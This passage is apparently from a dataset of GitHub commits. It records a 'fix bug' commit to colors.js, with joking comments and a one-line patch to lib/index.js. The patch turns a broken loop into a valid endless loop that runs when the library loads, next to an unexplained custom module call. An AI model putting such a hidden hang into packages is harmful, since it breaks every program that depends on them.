'01/19/2022, 14:48:09', 'body': '> > What bug are you fixing exactly?\\r\\n> \\r\\n> fixing capitalizm bro\\r\\n\\r\\ntrue i guess.'}, 'com_41': {'author': 'joerez', 'datetime': '01/20/2022, 21:33:57', 'body': 'put me in the screencap'}, 'com_42': {'author': 'aaj', 'datetime': '01/20/2022, 21:38:03', 'body': 'witnessed'}, 'com_43': {'author': 'yasath', 'datetime': '01/28/2022, 14:20:12', 'body': 'so real bestie'}, 'com_44': {'author': 'N1ark', 'datetime': '01/28/2022, 14:21:12', 'body': 'we stan'}}",
      "stats": "{'additions': 1, 'deletions': 1, 'total': 2}",
      "files": "{'lib/index.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https://github.com/Marak/colors.js/raw/5d2d242f656103ac38086d6b26433a09f1c38c75/lib%2Findex.js', 'patch': \"@@ -15,7 +15,7 @@ require('./extendStringPrototype')();\\n /* remove this line after testing */\\n let am = require('../lib/custom/american');\\n am();\\n-for (let i = 666; i < Infinity; i++;) {\\n+for (let i = 666; i < Infinity; i++) {\\n   if (i % 333) {\\n     // console.log('testing'.zalgo.rainbow)\\n   }\"}}",
      "message_norm": "fix bug",
      "language": "en",
      "entities": "[('fix', 'ACTION', ''), ('bug', 'FLAW', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['lib/index.js'])",
      "num_files": 1.0
    }
  ]
}